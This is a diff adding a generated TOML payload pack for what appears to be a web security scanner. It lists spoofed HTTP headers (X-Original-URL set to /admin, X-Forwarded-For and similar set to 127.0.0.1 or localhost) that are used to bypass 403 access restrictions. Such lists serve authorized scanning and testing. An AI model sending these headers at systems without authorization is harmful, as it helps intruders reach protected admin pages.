@@ -1,0 +1,53 @@
+# GENERATED from bypass403::LEGACY_HEADER_BYPASSES  -  DO NOT hand-edit.
+# Regenerate: GOSSAN_GEN_HIDDEN=1 cargo test -p gossan-hidden emit_bypass403_pack
+# Tier-B recall FLOOR; extend via community *.toml drop-ins.
+
+[[bypass]]
+header = "X-Original-URL"
+value = "/admin"
+label = "x-original-url rewrite"
+
+[[bypass]]
+header = "X-Rewrite-URL"
+value = "/admin"
+label = "x-rewrite-url rewrite"
+
+[[bypass]]
+header = "X-Forwarded-For"
+value = "127.0.0.1"
+label = "xff localhost spoof"
+
+[[bypass]]
+header = "X-Custom-IP-Authorization"
+value = "127.0.0.1"
+label = "x-custom-ip-auth"
+
+[[bypass]]
+header = "X-Forwarded-Host"
+value = "localhost"
+label = "x-forwarded-host localhost"
+
+[[bypass]]
+header = "X-Host"
+value = "localhost"
+label = "x-host localhost"
+
+[[bypass]]
+header = "X-Remote-IP"
+value = "127.0.0.1"
+label = "x-remote-ip spoof"
+
+[[bypass]]
+header = "X-Client-IP"
+value = "127.0.0.1"
+label = "x-client-ip spoof"
+
+[[bypass]]
+header = "X-Real-IP"
+value = "127.0.0.1"
+label = "x-real-ip spoof"
+
+[[bypass]]
+header = "X-Originating-IP"
+value = "127.0.0.1"
+label = "x-originating-ip spoof"
